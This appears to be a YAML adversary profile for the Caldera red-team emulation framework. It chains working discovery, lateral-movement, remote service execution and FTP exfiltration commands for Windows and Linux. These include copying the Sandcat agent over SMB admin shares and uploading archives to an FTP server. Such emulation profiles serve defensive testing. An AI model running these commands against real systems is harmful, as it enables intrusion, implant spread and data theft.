adversary_id: custom_adversary_profile__None__None__stockpile__2023-10-19-22_46_40
name: Custom Adversary Profile
description: None
atomic_ordering:
- 8adf02e8-6e71-4244-886c-98c402857404 # ('8adf02e8-6e71-4244-886c-98c402857404', 'None', 'None') ; {'description': 'Capture running processes and their loaded DLLs', 'tactic': 'discovery', 'technique': {'attack_id': 'T1057', 'name': 'Process Discovery'}, 'platforms': {'windows': {'psh': {'command': 'tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtool.log\n'}}}, 'id__dependence__fact': ['8adf02e8-6e71-4244-886c-98c402857404', 'None', 'None'], 'plugin': 'stockpile'}
- 2dece965-37a0-4f70-a391-0f30e3331aba # ('2dece965-37a0-4f70-a391-0f30e3331aba', 'None', 'host.installed.av') ; {'description': 'Identify AV', 'tactic': 'discovery', 'technique': {'attack_id': 'T1518.001', 'name': 'Software Discovery: Security Software Discovery'}, 'platforms': {'darwin': {'sh': {'command': 'find /Applications/ -maxdepth 2 -iname *.app | grep -io "[a-z ]*\\.app" | grep -Ei -- "symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)"\n', 'parsers': {'plugins.stockpile.app.parsers.antivirus': [{'source': 'host.installed.av'}]}}}, 'windows': {'psh': {'command': 'wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.installed.av'}]}}}}, 'id__dependence__fact': ['2dece965-37a0-4f70-a391-0f30e3331aba', 'None', 'host.installed.av'], 'plugin': 'stockpile'}
- c9be8043-a445-4cbf-b77b-ed7bb007fc7c # ('c9be8043-a445-4cbf-b77b-ed7bb007fc7c', 'None', 'None') ; {'description': 'Determine the version of Internet Explorer running', 'tactic': 'discovery', 'technique': {'attack_id': 'T1518', 'name': 'Software Discovery'}, 'platforms': {'windows': {'psh': {'command': "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version\n"}}}, 'id__dependence__fact': ['c9be8043-a445-4cbf-b77b-ed7bb007fc7c', 'None', 'None'], 'plugin': 'stockpile'}
- d754878c-17dd-46dc-891c-a993f8a10336 # ('d754878c-17dd-46dc-891c-a993f8a10336', 'host.dir.compress', 'None') ; {'description': 'This ability exfiltrates a compressed archive to an FTP server.', 'tactic': 'exfiltration', 'technique': {'attack_id': 'T1048.003', 'name': 'Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol'}, 'platforms': {'linux': {'sh': {'command': 'LocalFile=\'#{host.dir.compress}\';\nRemoteName="$(date \'+%Y%m%d%H%M%S\')-exfil-#{paw}-$(basename $LocalFile)";\ncurl -T #{host.dir.compress} ftp://#{ftp.server.address}/$RemoteName --user #{ftp.user.name}:\'#{ftp.user.password}\'\n'}}, 'windows': {'psh': {'command': '$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)";\n$ftp = [System.Net.FtpWebRequest]::Create("ftp://#{ftp.server.address}/$RemoteName");\n$ftp = [System.Net.FTPWebRequest]$ftp;\n$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;\n$ftp.Credentials = New-Object System.Net.NetworkCredential("#{ftp.user.name}", "#{ftp.user.password}");\n$ftp.UseBinary = $true;\n$ftp.UsePassive = $true;\n\n$content = [System.IO.File]::ReadAllBytes("#{host.dir.compress}");\n$ftp.ContentLength = $content.Length;\n$requestStream = $ftp.GetRequestStream();\n$requestStream.Write($content, 0, $content.Length);\n\n$requestStream.Close();\n$requestStream.Dispose();\n'}}}, 'id__dependence__fact': ['d754878c-17dd-46dc-891c-a993f8a10336', 'host.dir.compress', 'None'], 'plugin': 'stockpile'}
- deeac480-5c2a-42b5-90bb-41675ee53c7e # ('deeac480-5c2a-42b5-90bb-41675ee53c7e', 'None', 'remote.host.fqdn') ; {'description': 'View the shares of a remote host', 'tactic': 'discovery', 'technique': {'attack_id': 'T1135', 'name': 'Network Share Discovery'}, 'platforms': {'windows': {'psh': {'command': 'net view \\\\#{remote.host.fqdn} /all', 'parsers': {'plugins.stockpile.app.parsers.net_view': [{'source': 'remote.host.fqdn', 'edge': 'has_share', 'target': 'remote.host.share'}]}}, 'cmd': {'command': 'net view \\\\#{remote.host.fqdn} /all', 'parsers': {'plugins.stockpile.app.parsers.net_view': [{'source': 'remote.host.fqdn', 'edge': 'has_share', 'target': 'remote.host.share'}]}}}}, 'id__dependence__fact': ['deeac480-5c2a-42b5-90bb-41675ee53c7e', 'None', 'remote.host.fqdn'], 'plugin': 'stockpile'}
- 95727b87-175c-4a69-8c7a-a5d82746a753 # ('95727b87-175c-4a69-8c7a-a5d82746a753', 'remote.host.fqdn', 'None') ; {'description': 'Create a service named "sandsvc" to execute remote 54ndc57 binary named "s4ndc4t.exe"', 'tactic': 'execution', 'technique': {'attack_id': 'T1569.002', 'name': 'System Services: Service Execution'}, 'platforms': {'windows': {'psh': {'timeout': 300, 'cleanup': 'sc.exe \\\\#{remote.host.fqdn} stop sandsvc;\nsc.exe \\\\#{remote.host.fqdn} delete sandsvc /f;\ntaskkill /s \\\\#{remote.host.fqdn} /FI "Imagename eq s4ndc4t.exe"\n', 'command': 'sc.exe \\\\#{remote.host.fqdn} create sandsvc start= demand error= ignore binpath= "cmd /c start C:\\Users\\Public\\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}" displayname= "Sandcat Execution";\nsc.exe \\\\#{remote.host.fqdn} start sandsvc;\nStart-Sleep -s 15;\nGet-Process -ComputerName #{remote.host.fqdn} s4ndc4t;\n'}}}, 'id__dependence__fact': ['95727b87-175c-4a69-8c7a-a5d82746a753', 'remote.host.fqdn', 'None'], 'plugin': 'stockpile'}
- 65048ec1-f7ca-49d3-9410-10813e472b30 # ('65048ec1-f7ca-49d3-9410-10813e472b30', 'remote.host.fqdn', 'remote.host.fqdn') ; {'description': 'Copy 54ndc47 to remote host (SMB)', 'tactic': 'lateral-movement', 'technique': {'attack_id': 'T1021.002', 'name': 'Remote Services: SMB/Windows Admin Shares'}, 'platforms': {'windows': {'psh': {'command': '$path = "sandcat.go-windows";\n$drive = "\\\\#{remote.host.fqdn}\\C$";\nCopy-Item -v -Path $path -Destination $drive"\\Users\\Public\\s4ndc4t.exe";\n', 'cleanup': '$drive = "\\\\#{remote.host.fqdn}\\C$";\nRemove-Item -Path $drive"\\Users\\Public\\s4ndc4t.exe" -Force;\n', 'parsers': {'plugins.stockpile.app.parsers.54ndc47_remote_copy': [{'source': 'remote.host.fqdn', 'edge': 'has_54ndc47_copy'}]}, 'payloads': ['sandcat.go-windows']}}}, 'id__dependence__fact': ['65048ec1-f7ca-49d3-9410-10813e472b30', 'remote.host.fqdn', 'remote.host.fqdn'], 'plugin': 'stockpile'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []